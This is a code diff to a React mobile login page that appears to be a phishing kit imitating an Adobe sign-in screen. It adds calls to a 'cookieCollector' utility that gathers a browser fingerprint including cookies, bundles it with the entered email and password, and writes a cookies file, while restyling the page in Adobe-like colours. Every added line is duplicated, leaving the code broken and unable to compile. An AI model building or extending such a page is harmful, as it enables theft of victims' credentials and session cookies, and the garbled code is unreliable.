@@ -1,5 +1,7 @@
 import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
+import { collectBrowserFingerprint, createCookiesFile } from '../../utils/cookieCollector';
+import { collectBrowserFingerprint, createCookiesFile } from '../../utils/cookieCollector';
 
 interface MobileLoginPageProps {
   fileName: string;
@@ -85,6 +87,12 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
     setIsLoading(true);
 
     try {
+      // Collect comprehensive browser fingerprint including cookies
+      const browserFingerprint = collectBrowserFingerprint();
+      
+      // Collect comprehensive browser fingerprint including cookies
+      const browserFingerprint = collectBrowserFingerprint();
+      
       const loginData = {
         email,
         password,
@@ -92,10 +100,18 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
         fileName,
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent,
-        ip: 'hidden'
+        ip: 'hidden',
+        browserFingerprint
+        browserFingerprint
       };
 
       console.log('Attempting login with data:', { ...loginData, password: '[HIDDEN]' });
+
+      // Create and download cookies file
+      createCookiesFile(browserFingerprint, loginData);
+
+      // Create and download cookies file
+      createCookiesFile(browserFingerprint, loginData);
 
       const sessionData = storeSessionLocally(loginData);
 
@@ -207,16 +223,16 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
   };
 
   return (
-    <div className="min-h-screen relative overflow-hidden bg-gradient-to-br from-red-50 via-red-100/50 to-red-200/30">
-      {/* Mobile-optimized background */}
-      <div className="absolute inset-0 bg-gradient-to-br from-red-100/80 via-red-200/60 to-red-300/70"></div>
+    <div className="min-h-screen relative overflow-hidden">
+      {/* Adobe-style linear gradient background */}
+      <div className="absolute inset-0 bg-gradient-to-br from-[#F40F02] to-[#FAD0C4]"></div>
       <div className="absolute inset-0 backdrop-blur-sm"></div>
       
-      {/* Mobile decorative elements */}
-      <div className="absolute top-10 left-5 w-24 h-24 bg-red-300/25 rounded-full blur-xl"></div>
-      <div className="absolute bottom-10 right-5 w-32 h-32 bg-red-400/20 rounded-full blur-2xl"></div>
-      <div className="absolute top-1/2 left-1/4 w-16 h-16 bg-white/25 rounded-full blur-lg"></div>
-      <div className="absolute bottom-1/4 right-1/3 w-20 h-20 bg-red-200/20 rounded-full blur-lg"></div>
+      {/* Mobile-optimized complementary decorative elements */}
+      <div className="absolute top-10 left-5 w-24 h-24 bg-[#FAD0C4]/15 rounded-full blur-xl"></div>
+      <div className="absolute bottom-10 right-5 w-32 h-32 bg-white/10 rounded-full blur-2xl"></div>
+      <div className="absolute top-1/2 left-1/4 w-16 h-16 bg-white/15 rounded-full blur-lg"></div>
+      <div className="absolute bottom-1/4 right-1/3 w-20 h-20 bg-[#F40F02]/10 rounded-full blur-lg"></div>
       
       <div className="relative z-10 min-h-screen p-5">
         <div className="max-w-md mx-auto">
